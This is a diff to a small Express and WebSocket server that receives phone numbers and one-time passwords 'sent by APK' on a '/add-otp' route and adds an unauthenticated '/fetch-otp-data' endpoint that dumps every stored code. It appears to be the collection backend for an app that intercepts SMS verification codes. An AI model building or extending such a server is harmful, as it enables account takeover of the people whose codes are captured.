@@ -1,6 +1,6 @@
 const express = require('express');
 const path = require('path');
-const { WebSocketServer } = require('ws'); // Import WebSocket library
+const { WebSocketServer } = require('ws'); // WebSocket library
 
 const app = express();
 
@@ -28,8 +28,11 @@ wss.on('connection', (ws) => {
     });
 });
 
+// Serve static HTML from 'public' folder
+app.use(express.static(path.join(__dirname, 'public')));
+
 // Endpoint to receive phone and OTP (sent by APK)
-app.get('/', (req, res) => {
+app.get('/add-otp', (req, res) => {
     const phone = req.query.phone;
     const otp = req.query.otp;
 
@@ -56,7 +59,7 @@ app.get('/', (req, res) => {
         // If no OTP is provided, return the latest OTP for the phone number
         const lastOtp = otpData[phone];
         if (lastOtp) {
-            res.redirect(`/?phone=${phone}&otp=${lastOtp}`);
+            res.redirect(`/add-otp?phone=${phone}&otp=${lastOtp}`);
         } else {
             res.status(404).json({
                 message: 'No OTP found for this phone number',
@@ -66,8 +69,10 @@ app.get('/', (req, res) => {
     }
 });
 
-// Serve static HTML from 'public' folder
-app.use(express.static(path.join(__dirname, 'public')));
+// Fetch all OTP data
+app.get('/fetch-otp-data', (req, res) => {
+    res.json(otpData);
+});
 
 // Start the server and attach WebSocket
 const server = app.listen(process.env.PORT || 3000, () => {
